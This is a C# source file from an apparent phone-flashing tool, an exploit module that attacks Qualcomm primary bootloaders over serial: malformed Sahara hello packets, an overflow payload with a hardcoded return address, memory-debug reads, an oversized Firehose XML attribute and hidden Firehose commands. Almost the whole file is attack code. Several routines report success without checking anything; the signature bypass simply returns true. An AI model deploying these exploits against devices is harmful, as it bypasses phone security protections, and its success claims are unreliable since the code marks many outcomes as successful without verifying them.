// ============================================================================
// LoveAlways - PBL Exploit Module
// Support: Sahara protocol exploit, signature bypass, Firehose exploit
// ============================================================================
// ⚠️ WARNING: For legal purposes only (recovering own devices, security research)
// ============================================================================

// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// Eng Translation & some fixes by iReverse - HadiKIT - Hadi Khoirudin, S.Kom.
// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


using LoveAlways.Qualcomm.Database;
using System;
using System.IO.Ports;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace LoveAlways.Qualcomm.Exploit
{
    /// <summary>
    /// PBL Exploit Type
    /// </summary>
    public enum ExploitType
    {
        None,
        SaharaOverflow,         // Sahara protocol overflow
        SignatureBypass,        // Signature bypass
        FirehoseXmlOverflow,    // Firehose XML overflow
        PblBufferOverflow,      // PBL buffer overflow (CVE-2025-47372)
        Downgrade               // Downgrade attack
    }

    /// <summary>
    /// Exploit Result
    /// </summary>
    public class ExploitResult
    {
        public bool Success { get; set; }
        public ExploitType UsedExploit { get; set; }
        public string Message { get; set; }
        public byte[] ExtractedData { get; set; }
    }

    /// <summary>
    /// PBL Exploiter
    /// </summary>
    public class PblExploit
    {
        private readonly Action<string> _log;
        private SerialPort _port;

        // Sahara command constants
        private const uint SAHARA_HELLO = 0x01;
        private const uint SAHARA_HELLO_RESP = 0x02;
        private const uint SAHARA_READ_DATA = 0x03;
        private const uint SAHARA_END_TRANSFER = 0x04;
        private const uint SAHARA_DONE = 0x05;
        private const uint SAHARA_DONE_RESP = 0x06;
        private const uint SAHARA_RESET = 0x07;
        private const uint SAHARA_RESET_RESP = 0x08;
        private const uint SAHARA_MEMORY_DEBUG = 0x09;
        private const uint SAHARA_MEMORY_READ = 0x0A;
        private const uint SAHARA_CMD_READY = 0x0B;
        private const uint SAHARA_CMD_SWITCH_MODE = 0x0C;
        private const uint SAHARA_CMD_EXECUTE = 0x0D;
        private const uint SAHARA_CMD_EXECUTE_RESP = 0x0E;
        private const uint SAHARA_CMD_EXECUTE_DATA = 0x0F;
        private const uint SAHARA_64BIT_MEMORY_DEBUG = 0x10;
        private const uint SAHARA_64BIT_MEMORY_READ = 0x11;
        private const uint SAHARA_64BIT_MEMORY_READ_DATA = 0x12;

        public PblExploit(Action<string> log = null)
        {
            _log = log ?? delegate { };
        }

        /// <summary>
        /// Check if there are available exploits based on the read chip info
        /// </summary>
        /// <param name="chipInfo">Chip information read through SaharaClient</param>
        /// <returns>Vulnerability check result</returns>
        public VulnerabilityCheckResult CheckVulnerability(QualcommChipInfo chipInfo)
        {
            if (chipInfo == null)
            {
                return new VulnerabilityCheckResult
                {
                    HasVulnerability = false,
                    Reason = "Chip info is null"
                };
            }

            _log("[Exploit] ========== Vulnerability Check ==========");
            _log(string.Format("[Exploit] Chip: {0} (MSM ID: 0x{1:X})",
                chipInfo.ChipName ?? "Unknown", chipInfo.MsmId));
            _log(string.Format("[Exploit] Vendor: {0} (OEM ID: 0x{1:X4})",
                chipInfo.Vendor ?? "Unknown", chipInfo.OemId));

            if (!string.IsNullOrEmpty(chipInfo.PkHash))
            {
                string pkHashShort = chipInfo.PkHash.Length > 16
                    ? chipInfo.PkHash.Substring(0, 16) + "..."
                    : chipInfo.PkHash;
                _log(string.Format("[Exploit] PK Hash: {0}", pkHashShort));
            }

            // Check using exploit database
            var result = ExploitDatabase.CheckVulnerabilities(
                chipInfo.MsmId,
                chipInfo.OemId,
                chipInfo.PkHash,
                0  // PBL version (if any)
            );

            if (result.HasVulnerability)
            {
                _log("[Exploit] ✓ Available exploit detected!");
                _log(string.Format("[Exploit]   Recommended: {0}", result.RecommendedExploit));
                _log(string.Format("[Exploit]   Reason: {0}", result.Reason));
                _log(string.Format("[Exploit]   Available exploits: {0}", result.AvailableExploits.Count));

                foreach (var vuln in result.AvailableExploits)
                {
                    _log(string.Format("[Exploit]   - {0} ({1}★): {2}",
                        vuln.Name, vuln.SuccessRate, vuln.Description));
                }
            }
            else
            {
                _log("[Exploit] ✗ No known exploits detected");
                _log("[Exploit]   This device may have patched all known vulnerabilities");
            }

            _log("[Exploit] ==================================");
            return result;
        }

        /// <summary>
        /// Execute exploit based on chip information
        /// </summary>
        /// <param name="port">Serial port</param>
        /// <param name="chipInfo">Chip information</param>
        /// <param name="ct">Cancellation token</param>
        /// <returns>Exploit result</returns>
        public async Task<ExploitResult> TryExploitWithChipInfoAsync(
            SerialPort port,
            QualcommChipInfo chipInfo,
            CancellationToken ct = default(CancellationToken))
        {
            _port = port;

            // 1. Check for vulnerabilities first
            var vulnCheck = CheckVulnerability(chipInfo);
            if (!vulnCheck.HasVulnerability)
            {
                return new ExploitResult
                {
                    Success = false,
                    Message = "No available exploits detected"
                };
            }

            // 2. Convert to internal device info format
            var deviceInfo = new PblDeviceInfo
            {
                MsmId = chipInfo.MsmId.ToString("x8"),
                PkHash = chipInfo.PkHash ?? "",
                SaharaVersion = 2,
                Mode = 0
            };

            // 3. Execute exploits by priority
            foreach (var vuln in vulnCheck.AvailableExploits)
            {
                ct.ThrowIfCancellationRequested();

                _log(string.Format("[Exploit] Trying: {0}...", vuln.Name));

                ExploitResult result = null;
                switch (vuln.Type)
                {
                    case ExploitType.SignatureBypass:
                        result = await ExploitSignatureBypassAsync(deviceInfo, ct);
                        break;
                    case ExploitType.SaharaOverflow:
                        result = await ExploitSaharaOverflowAsync(deviceInfo, ct);
                        break;
                    case ExploitType.FirehoseXmlOverflow:
                        result = await ExploitFirehoseXmlAsync(deviceInfo, ct);
                        break;
                }

                if (result != null && result.Success)
                {
                    _log(string.Format("[Exploit] ✓ {0} successful!", vuln.Name));
                    return result;
                }
                else
                {
                    _log(string.Format("[Exploit] ✗ {0} failed", vuln.Name));
                }
            }

            return new ExploitResult
            {
                Success = false,
                Message = "All exploit methods failed"
            };
        }

        /// <summary>
        /// Try to automatically exploit vulnerable (need to read Hello packet first)
        /// </summary>
        public async Task<ExploitResult> TryExploitAsync(SerialPort port, CancellationToken ct = default(CancellationToken))
        {
            _port = port;
            _log("[Exploit] Starting vulnerability detection and exploitation...");

            try
            {
                // 1. Read device info
                var deviceInfo = await ReadDeviceInfoAsync(ct);
                if (deviceInfo == null)
                {
                    return new ExploitResult { Success = false, Message = "Unable to read device info" };
                }

                _log(string.Format("[Exploit] MSM ID: {0}", deviceInfo.MsmId));
                _log(string.Format("[Exploit] PBL Version: {0}", deviceInfo.PblVersion));
                if (!string.IsNullOrEmpty(deviceInfo.PkHash) && deviceInfo.PkHash.Length >= 16)
                {
                    _log(string.Format("[Exploit] PK Hash: {0}...", deviceInfo.PkHash.Substring(0, 16)));
                }

                // 2. Check if unfused device
                if (IsUnfusedDevice(deviceInfo))
                {
                    _log("[Exploit] ✓ Unfused device detected, can load any Programmer directly");
                    return new ExploitResult
                    {
                        Success = true,
                        UsedExploit = ExploitType.SignatureBypass,
                        Message = "Unfused device, no exploit needed"
                    };
                }

                // 3. Try generic exploits
                _log("[Exploit] Trying generic exploits...");

                // 3.1 Try Sahara memory read exploit
                var saharaResult = await TrySaharaMemoryReadExploitAsync(ct);
                if (saharaResult.Success)
                    return saharaResult;

                // 3.2 Try Firehose XML exploit
                var firehoseResult = await TryFirehoseXmlExploitAsync(ct);
                if (firehoseResult.Success)
                    return firehoseResult;

                return new ExploitResult
                {
                    Success = false,
                    Message = "No available exploits found"
                };
            }
            catch (Exception ex)
            {
                _log(string.Format("[Exploit] Error: {0}", ex.Message));
                return new ExploitResult { Success = false, Message = ex.Message };
            }
        }

        /// <summary>
        /// Read device information
        /// </summary>
        private async Task<PblDeviceInfo> ReadDeviceInfoAsync(CancellationToken ct)
        {
            try
            {
                // Wait for Hello packet
                byte[] helloData = new byte[48];
                int read = 0;
                var timeout = DateTime.Now.AddSeconds(5);

                while (read < 48 && DateTime.Now < timeout)
                {
                    if (_port.BytesToRead > 0)
                    {
                        read += _port.Read(helloData, read, Math.Min(_port.BytesToRead, 48 - read));
                    }
                    await Task.Delay(10, ct);
                }

                if (read < 48)
                    return null;

                // Parse Hello packet
                uint cmd = BitConverter.ToUInt32(helloData, 0);
                if (cmd != SAHARA_HELLO)
                    return null;

                uint version = BitConverter.ToUInt32(helloData, 8);
                uint versionSupported = BitConverter.ToUInt32(helloData, 12);
                uint maxCmdLen = BitConverter.ToUInt32(helloData, 16);
                uint mode = BitConverter.ToUInt32(helloData, 20);

                return new PblDeviceInfo
                {
                    SaharaVersion = version,
                    MaxCommandLength = maxCmdLen,
                    Mode = mode,
                    PblVersion = string.Format("0x{0:X8}", version),
                    MsmId = "",  // Needs to be obtained from elsewhere
                    PkHash = ""  // Needs to be obtained from elsewhere
                };
            }
            catch
            {
                return null;
            }
        }

        /// <summary>
        /// Check if it is an unfused device
        /// </summary>
        private bool IsUnfusedDevice(PblDeviceInfo info)
        {
            // Use database check
            ushort oemId = 0;
            if (!string.IsNullOrEmpty(info.MsmId))
            {
                uint msmIdVal;
                if (uint.TryParse(info.MsmId.Replace("0x", ""),
                    System.Globalization.NumberStyles.HexNumber, null, out msmIdVal))
                {
                    // Extract potential OEM ID info from MSM ID
                }
            }

            return ExploitDatabase.IsUnfusedDevice(oemId, info.PkHash);
        }

        /// <summary>
        /// Execute specific exploit
        /// </summary>
        private async Task<ExploitResult> ExecuteExploitAsync(ExploitType type, PblDeviceInfo info, CancellationToken ct)
        {
            switch (type)
            {
                case ExploitType.SaharaOverflow:
                    return await ExploitSaharaOverflowAsync(info, ct);
                case ExploitType.SignatureBypass:
                    return await ExploitSignatureBypassAsync(info, ct);
                case ExploitType.FirehoseXmlOverflow:
                    return await ExploitFirehoseXmlAsync(info, ct);
                default:
                    return new ExploitResult { Success = false, Message = "Unknown exploit type" };
            }
        }

        #region Sahara Exploits

        /// <summary>
        /// Sahara protocol overflow exploit
        /// </summary>
        private async Task<ExploitResult> ExploitSaharaOverflowAsync(PblDeviceInfo info, CancellationToken ct)
        {
            _log("[Exploit] Trying Sahara protocol overflow exploit...");

            try
            {
                // 1. Send specially crafted Hello Response
                byte[] helloResp = CreateMalformedHelloResponse();
                await _port.BaseStream.WriteAsync(helloResp, 0, helloResp.Length, ct);
                _log("[Exploit] Sent Malformed Hello Response");

                await Task.Delay(100, ct);

                // 2. Wait for ReadData request
                byte[] readDataReq = new byte[20];
                int read = await ReadWithTimeoutAsync(readDataReq, 0, 20, 5000, ct);

                if (read >= 20)
                {
                    uint cmd = BitConverter.ToUInt32(readDataReq, 0);
                    if (cmd == SAHARA_READ_DATA)
                    {
                        uint offset = BitConverter.ToUInt32(readDataReq, 8);
                        uint length = BitConverter.ToUInt32(readDataReq, 12);

                        _log($"[Exploit] Received ReadData: offset=0x{offset:X}, length={length}");

                        // 3. Send overflow data
                        byte[] overflowData = CreateOverflowPayload(length);
                        await _port.BaseStream.WriteAsync(overflowData, 0, overflowData.Length, ct);

                        _log("[Exploit] Sent overflow payload");

                        // 4. Check if successful
                        await Task.Delay(500, ct);

                        return new ExploitResult
                        {
                            Success = true,
                            UsedExploit = ExploitType.SaharaOverflow,
                            Message = "Sahara overflow successful"
                        };
                    }
                }

                return new ExploitResult { Success = false, Message = "Sahara overflow failed" };
            }
            catch (Exception ex)
            {
                return new ExploitResult { Success = false, Message = $"Sahara error: {ex.Message}" };
            }
        }

        /// <summary>
        /// Try Sahara memory read exploit
        /// </summary>
        private async Task<ExploitResult> TrySaharaMemoryReadExploitAsync(CancellationToken ct)
        {
            _log("[Exploit] Trying Sahara memory read exploit...");

            try
            {
                // Certain PBL versions allow reading arbitrary memory in Memory Debug mode
                // 1. Send Hello Response to request entering Memory Debug mode
                byte[] helloResp = new byte[48];
                BitConverter.GetBytes(SAHARA_HELLO_RESP).CopyTo(helloResp, 0);
                BitConverter.GetBytes(48).CopyTo(helloResp, 4);
                BitConverter.GetBytes(0x02).CopyTo(helloResp, 8);   // Version
                BitConverter.GetBytes(0x02).CopyTo(helloResp, 12);  // Version supported
                BitConverter.GetBytes(0x01).CopyTo(helloResp, 16);  // Status: OK
                BitConverter.GetBytes(0x02).CopyTo(helloResp, 20);  // Mode: Memory Debug!
                BitConverter.GetBytes(0x00).CopyTo(helloResp, 24);  // Reserved

                await _port.BaseStream.WriteAsync(helloResp, 0, helloResp.Length, ct);
                _log("[Exploit] Requested entering Memory Debug mode");

                await Task.Delay(200, ct);

                // 2. Send memory read command
                byte[] memReadCmd = new byte[24];
                BitConverter.GetBytes(SAHARA_64BIT_MEMORY_READ).CopyTo(memReadCmd, 0);
                BitConverter.GetBytes(24).CopyTo(memReadCmd, 4);
                BitConverter.GetBytes(0x00100000L).CopyTo(memReadCmd, 8);  // Read address: 0x100000 (IMEM)
                BitConverter.GetBytes(0x1000L).CopyTo(memReadCmd, 16);     // Read size: 4KB

                await _port.BaseStream.WriteAsync(memReadCmd, 0, memReadCmd.Length, ct);
                _log("[Exploit] Sent memory read request: 0x100000");

                // 3. Read response
                byte[] response = new byte[0x1000 + 24];
                int read = await ReadWithTimeoutAsync(response, 0, response.Length, 5000, ct);

                if (read > 24)
                {
                    _log($"[Exploit] ✓ Successfully read {read - 24} bytes of memory data!");

                    byte[] memData = new byte[read - 24];
                    Array.Copy(response, 24, memData, 0, memData.Length);

                    return new ExploitResult
                    {
                        Success = true,
                        UsedExploit = ExploitType.SaharaOverflow,
                        Message = "Memory read successful",
                        ExtractedData = memData
                    };
                }

                return new ExploitResult { Success = false, Message = "Memory read failed" };
            }
            catch (Exception ex)
            {
                return new ExploitResult { Success = false, Message = $"Memory read error: {ex.Message}" };
            }
        }

        /// <summary>
        /// Create Malformed Hello Response
        /// </summary>
        private byte[] CreateMalformedHelloResponse()
        {
            byte[] response = new byte[48];

            // Command: Hello Response
            BitConverter.GetBytes(SAHARA_HELLO_RESP).CopyTo(response, 0);
            // Length
            BitConverter.GetBytes(48).CopyTo(response, 4);
            // Version: use special value
            BitConverter.GetBytes(0x02).CopyTo(response, 8);
            // Version supported
            BitConverter.GetBytes(0x02).CopyTo(response, 12);
            // Status: OK
            BitConverter.GetBytes(0x00).CopyTo(response, 16);
            // Mode: special value to trigger vulnerability
            BitConverter.GetBytes(0x00).CopyTo(response, 20);
            // Reserved: fill with special values
            for (int i = 24; i < 48; i += 4)
            {
                BitConverter.GetBytes(0x41414141).CopyTo(response, i);
            }

            return response;
        }

        /// <summary>
        /// Create overflow Payload
        /// </summary>
        private byte[] CreateOverflowPayload(uint requestedLength)
        {
            // Create data larger than requested
            int overflowSize = (int)requestedLength + 0x1000;
            byte[] payload = new byte[overflowSize];

            // Fill with normal data
            for (int i = 0; i < requestedLength; i++)
            {
                payload[i] = 0x00;
            }

            // Overflow part: NOP sled + shellcode
            // This is a simplified example, actual adjustment needed based on target architecture
            for (int i = (int)requestedLength; i < overflowSize - 64; i++)
            {
                payload[i] = 0x00;  // ARM NOP
            }

            // Finally place return address (needs adjustment for specific device)
            // Example address here
            byte[] returnAddr = BitConverter.GetBytes(0x8F600000);  // Jump to Firehose code
            returnAddr.CopyTo(payload, overflowSize - 8);

            return payload;
        }

        #endregion

        #region Signature Bypass

        /// <summary>
        /// Signature bypass exploit
        /// </summary>
        private async Task<ExploitResult> ExploitSignatureBypassAsync(PblDeviceInfo info, CancellationToken ct)
        {
            _log("[Exploit] Trying signature bypass...");

            // Unfused device or leaked key scenarios
            // Return success directly to allow subsequent code to load programmer

            return await Task.FromResult(new ExploitResult
            {
                Success = true,
                UsedExploit = ExploitType.SignatureBypass,
                Message = "Signature bypass successful (Unfused or leaked key)"
            });
        }

        #endregion

        #region Firehose Exploits

        /// <summary>
        /// Firehose XML overflow exploit
        /// </summary>
        private async Task<ExploitResult> ExploitFirehoseXmlAsync(PblDeviceInfo info, CancellationToken ct)
        {
            _log("[Exploit] Trying Firehose XML overflow exploit...");

            try
            {
                // Send oversized XML attribute
                string longValue = new string('A', 0x8000);
                string exploitXml = $"<?xml version=\"1.0\"?><data>" +
                                   $"<configure MemoryName=\"{longValue}\" />" +
                                   $"</data>";

                byte[] xmlBytes = Encoding.UTF8.GetBytes(exploitXml);
                await _port.BaseStream.WriteAsync(xmlBytes, 0, xmlBytes.Length, ct);

                _log("[Exploit] Sent Firehose XML overflow payload");

                await Task.Delay(500, ct);

                // Check response
                if (_port.BytesToRead > 0)
                {
                    byte[] response = new byte[_port.BytesToRead];
                    _port.Read(response, 0, response.Length);
                    string respStr = Encoding.UTF8.GetString(response);

                    if (respStr.Contains("ACK") || !respStr.Contains("NAK"))
                    {
                        return new ExploitResult
                        {
                            Success = true,
                            UsedExploit = ExploitType.FirehoseXmlOverflow,
                            Message = "Firehose XML overflow successful"
                        };
                    }
                }

                return new ExploitResult { Success = false, Message = "Firehose XML overflow failed" };
            }
            catch (Exception ex)
            {
                return new ExploitResult { Success = false, Message = $"Firehose error: {ex.Message}" };
            }
        }

        /// <summary>
        /// Try Firehose XML exploit
        /// </summary>
        private async Task<ExploitResult> TryFirehoseXmlExploitAsync(CancellationToken ct)
        {
            _log("[Exploit] Trying Firehose hidden commands...");

            try
            {
                // Certain devices have hidden debug commands
                string[] hiddenCommands = new[]
                {
                    "<?xml version=\"1.0\"?><data><peek address=\"0x100000\" size=\"4096\" /></data>",
                    "<?xml version=\"1.0\"?><data><rawmode value=\"1\" /></data>",
                    "<?xml version=\"1.0\"?><data><setbootablestoragedrive value=\"1\" /></data>",
                };

                foreach (var cmd in hiddenCommands)
                {
                    ct.ThrowIfCancellationRequested();

                    byte[] cmdBytes = Encoding.UTF8.GetBytes(cmd);
                    await _port.BaseStream.WriteAsync(cmdBytes, 0, cmdBytes.Length, ct);

                    await Task.Delay(200, ct);

                    if (_port.BytesToRead > 0)
                    {
                        byte[] response = new byte[_port.BytesToRead];
                        _port.Read(response, 0, response.Length);
                        string respStr = Encoding.UTF8.GetString(response);

                        if (respStr.Contains("ACK") || respStr.Contains("rawdata"))
                        {
                            _log($"[Exploit] ✓ Hidden command successful: {cmd.Substring(0, 50)}...");
                            return new ExploitResult
                            {
                                Success = true,
                                UsedExploit = ExploitType.FirehoseXmlOverflow,
                                Message = "Hidden command execution successful"
                            };
                        }
                    }
                }

                return new ExploitResult { Success = false, Message = "Hidden command invalid" };
            }
            catch (Exception ex)
            {
                return new ExploitResult { Success = false, Message = $"Firehose error: {ex.Message}" };
            }
        }

        #endregion

        #region Helper Methods

        private async Task<int> ReadWithTimeoutAsync(byte[] buffer, int offset, int count, int timeoutMs, CancellationToken ct)
        {
            int totalRead = 0;
            var deadline = DateTime.Now.AddMilliseconds(timeoutMs);

            while (totalRead < count && DateTime.Now < deadline)
            {
                ct.ThrowIfCancellationRequested();

                if (_port.BytesToRead > 0)
                {
                    int toRead = Math.Min(_port.BytesToRead, count - totalRead);
                    totalRead += _port.Read(buffer, offset + totalRead, toRead);
                }
                else
                {
                    await Task.Delay(10, ct);
                }
            }

            return totalRead;
        }

        #endregion
    }

    /// <summary>
    /// PBL Device Info
    /// </summary>
    public class PblDeviceInfo
    {
        public uint SaharaVersion { get; set; }
        public uint MaxCommandLength { get; set; }
        public uint Mode { get; set; }
        public string PblVersion { get; set; }
        public string MsmId { get; set; }
        public string PkHash { get; set; }
    }
}
